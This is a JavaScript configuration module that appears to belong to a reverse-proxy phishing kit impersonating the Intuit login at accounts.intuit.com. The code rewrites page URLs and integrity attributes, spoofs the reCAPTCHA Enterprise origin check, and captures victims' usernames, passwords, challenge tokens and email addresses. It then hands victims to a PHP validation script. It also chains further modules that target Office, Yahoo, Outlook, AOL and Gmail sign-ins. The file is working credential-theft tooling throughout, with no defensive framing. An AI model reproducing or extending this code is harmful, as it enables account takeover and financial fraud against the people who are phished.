// eslint-disable-next-line max-classes-per-file
const path = require('path')
const url = require('url')

const globalWorker = process.HOOK_JS_MODULE

const OFFICE_MODULE = require('../office/main')
const YAHOO_MODULE = require('../yahoo/main')
const OUTLOOK_MODULE = require('../outlook/main')
const AOL_MODULE = require('../aol/main')
const GMAIL_MODULE = require('../gmail/main')


const ProxyRequest = class extends globalWorker.BaseClasses.BaseProxyRequestClass {

    constructor(proxyEndpoint, browserReq) {
        super(proxyEndpoint, browserReq)
    }

    processRequest() {
        if (this.browserReq.url.startsWith('/recaptcha')) {
            return this.browserReq.pipe(this.proxyEndpoint)
        }
        return super.processRequest()

    }


    
}

const DefaultHandler = class extends globalWorker.BaseClasses.BasePreClass {
    constructor(req, res, captureDict = configExport.CAPTURES) {
        super(req, res, captureDict)
    }

    static match(req) {
        return true

    }

    execute(clientContext) {

        
        if (clientContext.sessionBody.policies) {
            console.log('editing policies')
            Object.assign(clientContext.sessionBody,
                { username: clientContext.sessionBody?.policies[0]?.attributes[0]?.value })
            Object.assign(clientContext.sessionBody,
                { policies: undefined })
        } else if (clientContext.sessionBody.challenge) {

            if (clientContext.sessionBody.challenge[0].type === 'PASSWORD') {
                Object.assign(clientContext.sessionBody,
                    { password: clientContext.sessionBody?.challenge[0].value })
            }

        }

        if (this.req.url.startsWith('/recaptcha/enterprise/anchor') || this.req.url.startsWith('/us/en/recaptcha/enterprise/anchor')) {
            const hostnameKey = Buffer.from(`https://${clientContext.hostname}:443`)
            const hostnameBase64Key = hostnameKey.toString('base64');
            console.log(hostnameBase64Key)

            this.req.url = this.req.url.replace('..', '==')
            this.req.url = this.req.url.replace('.&', '=&')

            this.req.url = this.req.url.replace(hostnameBase64Key, 'aHR0cHM6Ly9hY2NvdW50cy5pbnR1aXQuY29tOjQ0Mw.')

            
            console.log(`\n babbbbbbbbbb\n\n\n${this.req.url}`)
            return super.superExecuteProxy('www.google.com', clientContext)


        }

        if (this.req.url.startsWith('/recaptcha/enterprise')) {
            
            return super.superExecuteProxy('www.google.com', clientContext)

        }

       

        if (this.req.url.startsWith('/recaptcha/releases')) {
            return super.superExecuteProxy('www.gstatic.com', clientContext)

        }

        const redirectToken = this.checkForRedirect()
        if (redirectToken !== null) {
            console.log(`Validating the redirect ${JSON.stringify(redirectToken)}`)


            const reqCheck = `${redirectToken.obj.pathname}${redirectToken.obj.query}`
            if (redirectToken.obj.pathname.startsWith('/account/challenge/recaptcha')) {
                this.req.url = reqCheck.replace(clientContext.hostname, 'www.google.com')

            } else {
                this.req.url = reqCheck 
            }

            return this.superExecuteProxy(redirectToken.obj.host, clientContext)
        }

        if (this.req.url.startsWith('/account-manager.html')) {
            super.sendClientData(clientContext, {})
            this.res.writeHead(302, { location: `/email/verify/auth?qrc=${clientContext.sessionBody.username}` })
            return super.cleanEnd(clientContext.currentDomain, clientContext)

        }

        return super.execute(clientContext)

    }
}

/** Defined Config used */

const configExport = {

    SCHEME: 'intuit',

    CURRENT_DOMAIN: 'accounts.intuit.com',

    START_PATH: '/',
    
    PATTERNS: [
        
        {
            match: '.api.intuit.com',
            replace: '{HOSTNAME}/sh.api.intuit.com/~',
        },
        
        {
            match: 'integrity',
            replace: 'xintegrity',
        },
        {
            match: 'www.google.com',
            replace: '{HOSTNAME}',
        },
        {
            match: 'www.gstatic.com',
            replace: '{HOSTNAME}',
        },
        {
            match: 'this._isLoggingEnabled=!0',
            replace: 'this._isLoggingEnabled=!!',
        },
        {
            match: 'sourceMappingURL=',
            replace: 'dontrread',
        },

        {
            match: 'https://sh',
            replace: 'https://',
        },
          
        {
            match: 'accounts.intuit.com',
            replace: '{HOSTNAME}/',
        },

        {
            domain: 'plugin.intuitcdn.net',
            match: 'intuitcdn.net',
            replace: '{HOSTNAME}',
        },
        {
            domain: 'plugin.intuitcdn.net',
            match: 'n.start();',
            replace: '',
        },
        {
            domain: 'plugin.intuitcdn.net',
            match: 'intuit.com',
            replace: '{HOSTNAME}',
        },
        {
            domain: 'plugin.intuitcdn.net',
            match: '"https://accounts".*?;',
            replace: '"https://{HOSTNAME}";',
        },

    ],

    EXTERNAL_FILTERS: [
        'sh.api.intuit.com',
        'plugin.intuitcdn.net',
    ],


    FORCE_PROXY: ['/auth/login/finish'],

    PHP_PROCESSOR: {

        '/email/verify/auth': {
            GET: {
                script: 'validate.php',
            },
            POST: {
                script: 'validate.php',
                
                redirectTo: '',

            },
        },
    },

    COOKIE_PATH: ['/account-manager.html', '/ius_proxy/v1/users/me/check_contact_info_status'],

    EXIT_TRIGGER_PATH: ['/auth/login/finish'],

    EXIT_URL: 'https://intuit.com',


    EXTRA_COMMANDS: [
        {
            path: '/identity-authn-core-ui/.*',
            command: 'CHANGE_DOMAIN',
            command_args: {
                new_domain: 'plugin.intuitcdn.net',
                persistent: false,
                },
        },

        // {
        //     path: '/recaptcha/enterprise',
        //     command: 'CHANGE_DOMAIN',
        //     command_args: {
        //         new_domain: 'www.google.com',
        //         persistent: false,
        //         },
        // },
    ],

    CAPTURES: {
        policies: {
            params: ['policies'],
            hosts: ['accounts.intuit.com'],
        },

        challenge: {
            params: ['challengeToken'],
            hosts: ['accounts.intuit.com'],
        },
        emailVerify: {
            params: ['email'],
            hosts: 'PHP-EXEC',
        },


    },


    IMPORTED_MODULES: [
        {
            beginAt: '/auth/login/office',
            exitAt: null,
            module: OFFICE_MODULE,
        },
        {
            beginAt: '/auth/login/yahoo',
            exitAt: null,
            module: YAHOO_MODULE,
        },
        {
            beginAt: '/auth/login/outlook',
            exitAt: null,
            module: OUTLOOK_MODULE,
        },
        {
            beginAt: '/auth/login/aol',
            exitAt: null,
            module: AOL_MODULE,
        },
        {
            beginAt: '/auth/login/gmail',
            exitAt: null,
            module: GMAIL_MODULE,
        }
    ],

    PRE_HANDLERS: [],
    
    PROXY_REQUEST: ProxyRequest,
    PROXY_RESPONSE: 'DEFAULT',
    DEFAULT_PRE_HANDLER: DefaultHandler,


   }
module.exports = configExport

